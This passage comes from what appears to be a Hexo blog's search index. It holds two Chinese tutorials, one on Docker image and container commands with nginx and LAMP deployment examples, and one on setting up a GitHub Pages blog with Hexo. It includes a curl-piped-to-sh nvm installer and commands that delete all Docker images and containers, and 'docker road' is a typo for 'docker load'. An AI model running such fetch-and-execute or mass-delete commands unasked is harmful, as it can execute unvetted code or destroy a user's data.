plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search [关键字]</span><br></pre></td></tr></table></figure><p><strong>拉取镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull [镜像全称]:版本标签(可选)</span><br></pre></td></tr></table></figure><p><strong>查看本地镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p><strong>删除镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi []</span><br></pre></td></tr></table></figure><p><strong>导出镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入镜像</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker road &lt; test.tar</span><br></pre></td></tr></table></figure><h2 id="3-容器操作"><a href="#3-容器操作" class="headerlink" title="3. 容器操作"></a>3. 容器操作</h2><p><strong>启动容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P --rm --name [容器名字] [镜像名称] [可执行命令]</span><br><span class="line">参数说明：</span><br><span class="line">-d：让容器在后台运行</span><br><span class="line">-P：将容器内部使用的网络端口映射到宿主机</span><br><span class="line">-p：[主机端口:容器端口] 可自定义映射端口</span><br><span class="line">--name：可自定义容器名称</span><br><span class="line">--rm：当容器停止时，会自动删除</span><br></pre></td></tr></table></figure><p><strong>查看运行容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><strong>查看容器端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器内部日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f [容器id/名称] //可以查看容器内部的标准输出</span><br><span class="line">-f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出</span><br></pre></td></tr></table></figure><p><strong>进入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it [容器id/名称] /bin/bash//推荐使用</span><br><span class="line">docker attach [容器id/名称] //不会在容器中创建进程执行额外的命令，只是附着到容器上</span><br><span class="line">//attach必须登陆到一个已经运行的容器里，如果从这个容器中exit退出的话，就会导致容器停止</span><br></pre></td></tr></table></figure><p><strong>离开容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+P+Q//正常退出不关闭容器</span><br><span class="line">exit//退出之后关闭容器,可以使用下面的流程进行恢复</span><br><span class="line">使用docker restart命令重启容器</span><br><span class="line">使用docker attach命令进入容器</span><br></pre></td></tr></table></figure><p><strong>停止容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>重新开启容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看所有容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>查看容器底层信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [容器id/名称]</span><br></pre></td></tr></table></figure><p><strong>删除容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm [容器id/名称]</span><br><span class="line">//删除前必须先停止正在运行的容器</span><br></pre></td></tr></table></figure><p><strong>导出容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker export [容器id/名称] &gt; test.tar</span><br></pre></td></tr></table></figure><p><strong>导入容器</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker import &lt; test.tar</span><br></pre></td></tr></table></figure><p><strong>docker批量删除容器、镜像</strong></p><p>一条命令实现停用并删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure><p>删除所有镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><p>按条件删除容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm $(docker ps -a | awk &apos;/test\/webapp/ &#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><p>按条件删除镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#没有打标签</span><br><span class="line">docker rmi `docker images -q | awk &apos;/^&lt;none&gt;/ &#123; print $3 &#125;&apos;`</span><br><span class="line">#镜像名包含关键字</span><br><span class="line">docker rmi --force `docker images | grep keywords | awk &apos;&#123;print $3&#125;&apos;`   </span><br><span class="line">//其中keywords为关键字</span><br></pre></td></tr></table></figure><h2 id="4-文件操作"><a href="#4-文件操作" class="headerlink" title="4. 文件操作"></a>4. 文件操作</h2><p>从主机目录拷贝到容器目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /var/www/example 96f7f14e99ab:/www/</span><br></pre></td></tr></table></figure><p>从容器目录拷贝到主机目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp  96f7f14e99ab:/www /var/www/example</span><br></pre></td></tr></table></figure><h1 id="六、容器部署实例"><a href="#六、容器部署实例" class="headerlink" title="六、容器部署实例"></a>六、容器部署实例</h1><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1. 安装nginx"></a>1. 安装nginx</h3><ul><li>从docker hub上拉取镜像</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx:latest</span><br></pre></td></tr></table></figure><ul><li>托管一些简单的静态内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run --name some-nginx -v  $PWD/html:/usr/share/nginx/html:ro -d nginx</span><br><span class="line"> -v $PWD/html:/usr/share/nginx/html：将主机中当前目录下的html挂载到容器的/usr/share/nginx/html</span><br></pre></td></tr></table></figure><ul><li>或者准备自己的配置文件和文件目录</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br><span class="line">#dockerhub上有详细自定义配置部署说明</span><br><span class="line">-p 80:80：将容器的80端口映射到主机的80端口</span><br><span class="line">--name mynginx：将容器命名为mynginx</span><br><span class="line">-v $PWD/www:/www：将主机中当前目录下的www挂载到容器的/www</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf：将主机中当前目录下的nginx.conf挂载到容器的/etc/nginx/nginx.conf</span><br><span class="line">-v $PWD/logs:/wwwlogs：将主机中当前目录下的logs挂载到容器的/wwwlogs</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：如果出现以下类似报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:344: starting container process caused &quot;process_linux.go:424: container init caused \&quot;rootfs_linux.go:58: mounting \\\&quot;/opt/nginx/conf/nginx.conf\\\&quot; to rootfs \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged\\\&quot; at \\\&quot;/var/lib/docker/overlay2/f72f02d7a8f04291ee3dd0515fd75cbaa8e12904816f5bb84c714da3d43f7cf0/merged/etc/nginx/nginx.conf\\\&quot; caused \\\&quot;not a directory\\\&quot;\&quot;&quot;: unknown: Are you trying to mount a directory onto a file (or vice-versa)? Check if the specified host path exists and is the expected type.</span><br></pre></td></tr></table></figure><p>是因为没提前创建好挂载目录和配置文件导致conf/nginx.conf 自动创建成目录，删除并创建nginx.conf配置文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ll conf/</span><br><span class="line">rm -r conf/nginx.conf</span><br><span class="line">touch conf/nginx.conf</span><br></pre></td></tr></table></figure><ul><li>查看运行容器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2018/08/28/Docker部署操作实例/docker入门-环境部署实例/8268763-bde19eff6c1fd6ea.png" alt="当前正在运行的容器"></p><h3 id="2-安装Lamp环境"><a href="#2-安装Lamp环境" class="headerlink" title="2. 安装Lamp环境"></a>2. 安装Lamp环境</h3><p>拉取一个lamp镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull fauria/lamp</span><br></pre></td></tr></table></figure><p>创建lamp目录&amp;挂载路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/lamp &amp;&amp; cd ~/lamp</span><br><span class="line">mkdir www logs</span><br></pre></td></tr></table></figure><p>创建容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d  -p 80:80 -v /opt/lamp/www:/var/www/html -v /opt/lamp/logs/:/var/log/httpd --name my-lamp-container fauria/lamp</span><br></pre></td></tr></table></figure><p>查看是否启动成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="/2018/08/28/Docker部署操作实例/docker入门-环境部署实例/8268763-1fab64e3d8195ff5.png" alt="STATUS为UP说明启动成功"></p><p>查看所有容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p>进入一个已经在运行的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#其中字符串为容器ID</span><br><span class="line">docker exec -it d27bd3998ad9 /bin/bash</span><br></pre></td></tr></table></figure><p>删除容器删除前先停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop  d27b  &amp; docker rm d27b</span><br></pre></td></tr></table></figure><h1 id="七、最后"><a href="#七、最后" class="headerlink" title="七、最后"></a>七、最后</h1><p>本文只是起到docker的入门作用，如果想深入学习</p><p>以下推荐几个dokcer在线学习网站</p><p>[Docker 教程 | 菜鸟教程]<a href="http://www.runoob.com/docker/docker-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/docker/docker-tutorial.html</a></p><p>[Docker 入门教程|阮一峰的网络日志]<a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客记录</title>
      <link href="/2018/07/13/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/07/13/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建GitHub-Pages"><a href="#一、创建GitHub-Pages" class="headerlink" title="一、创建GitHub Pages"></a>一、创建GitHub Pages</h2><p>使用GitHub Pages搭建博客的好处有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 全是静态文件，访问速度快；</span><br><span class="line">2. 免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</span><br><span class="line">3. 可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</span><br><span class="line">4. 数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</span><br><span class="line">5. 博客内容可以轻松打包、转移、发布到其它平台；</span><br><span class="line">6. 等等；</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-首先创建存储库"><a href="#1-首先创建存储库" class="headerlink" title="1. 首先创建存储库"></a>1. 首先创建存储库</h3><p>前往<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>并<a href="https://github.com/new" target="_blank" rel="noopener">创建一个</a>名为<em>username</em> .github.io <a href="https://github.com/new" target="_blank" rel="noopener">的新存储库</a>，其中<em>username</em>是GitHub上的用户名（或组织名称）</p><p><img src="/2018/07/13/搭建博客记录/利用github pages+hexo 搭建个人博客/1552609247373.png" alt="1552609247373"></p><p><strong>注意：如果存储库名字的第一部分与你的用户名不完全匹配，则无法正常工作，因此请务必正确使用。</strong></p><h3 id="2-安装-Git"><a href="#2-安装-Git" class="headerlink" title="2. 安装 Git"></a>2. 安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code> </li></ul><h3 id="3-配置SSH连接GitHub"><a href="#3-配置SSH连接GitHub" class="headerlink" title="3. 配置SSH连接GitHub"></a>3. 配置SSH连接GitHub</h3><ol><li><p>配置SSH Key</p><ul><li><p>检查本机是否有ssh key设置</p><p>右键打开git bash</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><ul><li>如果没有则提示： No such file or directory，则需要生成ssh密钥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;github注册邮箱&quot;</span><br></pre></td></tr></table></figure><ul><li><p>然后连续3次回车，最终会生成一个.ssh文件 复制.ssh/id_rsa.pub里内容<br>路径为：C:\Users\Administrator/.ssh (Administrator为你当前登录电脑使用的用户名)</p></li><li><p>打开github - 右上角头像 -Setting - SSH and GPG keys - New SSH key<br>title随便填写，Key内容为.ssh/id_rsa.pub的内容</p><p><img src="/2018/07/13/搭建博客记录/利用github pages+hexo 搭建个人博客/14398360-5516f5c5666265cd.png" alt="利用github pages+hexo 搭建个人博客"></p></li></ul></li><li><p>配置账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name “your_username”  #设置用户名</span><br><span class="line">git config --global user.email “your_registered_github_Email”  </span><br><span class="line">#设置邮箱地址(建议用注册giuhub的邮箱)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>测试是否配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com       # 邮箱地址不需要改。</span><br></pre></td></tr></table></figure><p>直接回车，最后看到这个就说明大功告成：</p><p><em>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</em></p></li></ol><h3 id="4-克隆到本地存储库"><a href="#4-克隆到本地存储库" class="headerlink" title="4. 克隆到本地存储库"></a>4. 克隆到本地存储库</h3><p>转到要存储项目的文件夹，然后克隆新存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/用户名/用户名.github.io</span><br></pre></td></tr></table></figure><h3 id="5-创建内容"><a href="#5-创建内容" class="headerlink" title="5. 创建内容"></a>5. 创建内容</h3><p>转入项目文件夹并添加index.html文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd username.github.io</span><br><span class="line">echo“Hello World”&gt;index.html</span><br></pre></td></tr></table></figure><h3 id="6-推送到GitHub"><a href="#6-推送到GitHub" class="headerlink" title="6. 推送到GitHub"></a>6. 推送到GitHub</h3><p>添加，提交和推送你的更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add --all</span><br><span class="line">git commit -m“初始提交”</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="7-浏览你的Github-Pages"><a href="#7-浏览你的Github-Pages" class="headerlink" title="7.浏览你的Github Pages"></a>7.浏览你的Github Pages</h3><p>Well done，启动浏览器并转到<a href="https://username.github.io。" target="_blank" rel="noopener">https://username.github.io。</a></p><h2 id="二、使用Hexo博客框架"><a href="#二、使用Hexo博客框架" class="headerlink" title="二、使用Hexo博客框架"></a>二、使用Hexo博客框架</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h3 id="1-安装前提"><a href="#1-安装前提" class="headerlink" title="1. 安装前提"></a>1. 安装前提</h3><ol><li>安装 Hexo 相当简单。然而在安装前，需确保已安装下列应用程序：</li></ol><ul><li><p><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></p></li><li><p><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></p></li></ul><ol start="2"><li><p>安装 Git，并开启ssh连接</p><p>上文已介绍安装和连接步骤</p></li></ol><ol start="3"><li>安装 Node.js</li></ol><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>。</p><p>cURL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></table></figure><p>或者您也可以下载 <a href="http://nodejs.org/" target="_blank" rel="noopener">安装程序</a> 来安装。</p><blockquote><p>Windows 用户</p><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><h3 id="2-快速部署Hexo"><a href="#2-快速部署Hexo" class="headerlink" title="2. 快速部署Hexo"></a>2. 快速部署Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p><strong>_config.yml</strong></p><p>网站的配置信息，您可以在此配置大部分的参数。</p><p><strong>package.json</strong></p><p>应用程序信息，新添加的插件内容也会出现在这里面。</p><p><strong>scaffolds</strong></p><p>模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>这里放了三个模板文件，分别是新添加博客文章（posts）、新添加博客页（page）和新添加草稿（draft）的目标样式。</p><p><strong>source</strong></p><p>资源文件夹是存放博客内容的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。之后我们通过命令新建tags（标签）还有categories（分类）页后，这里会相应地增加文件夹。</p><p><strong>themes</strong></p><p>主题文件夹。Hexo 会根据主题来生成静态页面。</p><h3 id="3-Hexo命令"><a href="#3-Hexo命令" class="headerlink" title="3. Hexo命令"></a>3. Hexo命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g(generate)#生成静态页面</span><br><span class="line">hexo s(server)#启动服务器，默认4000端口，在本地查看内容</span><br></pre></td></tr></table></figure><h3 id="4-部署到github"><a href="#4-部署到github" class="headerlink" title="4. 部署到github"></a>4. 部署到github</h3><p>修改git/blog/_config.yml配置，找到Deployment部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch] #published</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>安装 hexo-deployer-git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save   #第一次部署需要先安装插件</span><br></pre></td></tr></table></figure><p><strong>部署</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d(deploy) #部署到网站</span><br></pre></td></tr></table></figure><p>接下来可以访问我们的GitHub pages页面，查看效果啦</p><h3 id="5-最后"><a href="#5-最后" class="headerlink" title="5. 最后"></a>5. 最后</h3><p>关于hexo的最新详细配置，可以参考[hexo官方文档]:<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
